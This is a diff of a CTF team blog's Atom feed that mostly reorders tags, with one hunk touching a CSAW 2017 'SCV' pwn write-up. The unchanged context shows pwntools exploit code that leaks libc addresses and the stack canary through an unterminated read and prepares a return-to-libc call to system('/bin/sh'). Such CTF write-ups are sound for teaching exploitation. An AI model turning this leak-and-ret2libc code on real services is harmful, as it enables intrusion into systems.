@@ -90,9 +90,9 @@
     
       <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
@@ -143,8 +143,6 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
-    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
@@ -152,6 +150,8 @@
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
     
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
+    
+      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
     
   </entry>
   
@@ -234,7 +234,7 @@
     <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/"/>
     <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-scv/</id>
     <published>2017-09-18T20:59:25.000Z</published>
-    <updated>2017-09-27T13:27:21.911Z</updated>
+    <updated>2017-10-05T02:59:27.432Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>SCV<br><br>SCV is too hungry to mine the minerals. Can you give him some food?<br><br>nc pwn.chal.csaw.io 3764<br><br></blockquote>
 
@@ -246,15 +246,15 @@
 <p>As we can see above the <code>read</code> function is reading the buf from STDIN, and what can we know about <code>read</code>? This function <strong>doesn’t put a null byte</strong> at the end of the read string, this awesome ! and why? because latter with option 2 <code>puts</code> will print the string until it finds a <em>null byte</em>, we can use this to our advantage to <strong>leak addresses</strong> from libc from the <strong>stack</strong> and even the <strong>stack canary</strong> itself! We just need to use gdb and look up the memory!</p>
 <p>The plan is pretty simple:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Leak libc addresses and stack canary</div><div class="line">2 - Overflow the buffer and return to libc</div></pre></td></tr></table></figure>
-<h3 id="Leak-libc-addresses-and-stack-canary"><a href="#Leak-libc-addresses-and-stack-canary" class="headerlink" title="Leak libc addresses and stack canary"></a>Leak libc addresses and stack canary</h3><p>Lets do some debugging with gdb lets buffer a break point right before the read occurs and check the values of the buffer before being filled:</p>
+<h3 id="Leak-libc-addresses-and-stack-canary"><a href="#Leak-libc-addresses-and-stack-canary" class="headerlink" title="Leak libc addresses and stack canary"></a>Leak libc addresses and stack canary</h3><p>Lets do some debugging with gdb lets put a break point right before the read occurs and check the values of the buffer before being filled:</p>
 <p><a data-fancybox="gallery" href="https://i.imgur.com/pKfMLAJ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pKfMLAJ.png" alt=""><br></a></p>
-<p>As we can see there is a libc address in stack <code>0x00007f2cea4aabe9</code> we so can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.<br>Writing the code to do this is very simple can be built in a function like this:</p>
+<p>As we can see there is a libc address in stack <code>0x00007f2cea4aabe9</code> we can count it easily how much we need to fill the buffer to print that address! and we need 40 bytes.<br>Writing the code to do this is very simple can be built in a function like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readAddressFromTheStack</span><span class="params">(size, bytes_to_read, offset=<span class="number">0</span>)</span>:</span></div><div class="line">	<span class="string">"""</span></div><div class="line"><span class="string">    Args:</span></div><div class="line"><span class="string">        size (int): number of characters to send to the stack.</span></div><div class="line"><span class="string">        bytes_to_read (int): number of bytes to read from the stack we want to leak.</span></div><div class="line"><span class="string">		offset (int): number to subtract if we want to adjust the leaked address. (Optional)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    Returns:</span></div><div class="line"><span class="string">        int: returns an address leaked from the stack.</span></div><div class="line"><span class="string">	"""</span></div><div class="line">	</div><div class="line">	<span class="comment"># Write a certain number of bytes to leak an address</span></div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'1'</span>)</div><div class="line">	r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'A'</span>*size)</div><div class="line"></div><div class="line">	<span class="comment"># Read it from the stack</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">	r.sendline(<span class="string">'2'</span>)</div><div class="line">	r.recvuntil(<span class="string">'[*]PLEASE TREAT HIM WELL.....'</span>)</div><div class="line">	r.recvline()</div><div class="line">	r.recvline()</div><div class="line">	r.recv(size)</div><div class="line">	<span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))-offset</div></pre></td></tr></table></figure>
 <p>So what to do with this address? we can calculate its offset to <code>system</code> for example! we can get the system address to calculate the offset and subtract the both values:</p>
 <p><a data-fancybox="gallery" href="https://i.imgur.com/DTsmBOe.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/DTsmBOe.png" alt=""><br></a></p>
 <p>Implementing this in python would be like this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Get a libc address from the stack</span></div><div class="line">LEAKED = readAddressFromTheStack(<span class="number">40</span>, <span class="number">6</span>, <span class="number">-0x8f</span>)</div><div class="line">SYSTEM = LEAKED + <span class="number">0xb0f7</span></div><div class="line">LIBCBASE = SYSTEM -libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc-2.23.so | grep '/bin/sh'</span></div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line"></div><div class="line">log.info(<span class="string">"LEAKED LIBC 0x%x"</span> % LEAKED)</div><div class="line">log.info(<span class="string">"SYSTEM LIBC 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
-<p>The 3rd argument of <code>readAddressFromTheStack</code> is adjusting the address because in the <code>read</code> we are reading 40 bytes plus the new line character ‘\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just adjust the address, the leaked address will always be overwritten with <code>0x0a</code> which is ‘\n’ Ascii code representation, so as I said before it needs some adjusting.</p>
+<p>The 3rd argument of <code>readAddressFromTheStack</code> is adjusting the address because in the <code>read</code> we are reading 40 bytes plus the new line character ‘\n’ because to send to the server we need to press enter, I could actually instead of sending 40 bytes in the padding we could just send 39 and the number would be right but I got lazy during the CTF so instead of fixing that I just readjust the address, the leaked address will always be overwritten with <code>0x0a</code> which is ‘\n’ Ascii code representation, so as I said before it needs some adjusting.</p>
 <h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack canary"></a>Stack canary</h4><p>Now that we have everything we need for libc we just need to get the stack canary address! to check where its being stored we can look at the very beginning of the main function</p>
 <p><a data-fancybox="gallery" href="https://i.imgur.com/2L4LYMj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/2L4LYMj.png" alt=""><br></a></p>
 <p>From radare2 we can check it is being stored at local_8h which is a friendly name to be more readable in reality thinking it in assembly it’s stored in RBP-0x8 where RBP is the baseframe pointer.  </p>
@@ -280,9 +280,9 @@
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
@@ -538,9 +538,9 @@
       <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
     
     
-      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
-    
       <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
+    
+      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
       <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
     
@@ -674,9 +674,9 @@
     
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
     
-      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
-    
       <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
+    
+      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
     
       <category term="sqlinjection" scheme="https://teamrocketist.github.io/tags/sqlinjection/"/>
     
@@ -761,13 +761,13 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
-    
       <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
       <category term="stackoverflow" scheme="https://teamrocketist.github.io/tags/stackoverflow/"/>
+    
+      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
     
   </entry>
   
@@ -877,13 +877,13 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
+    
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
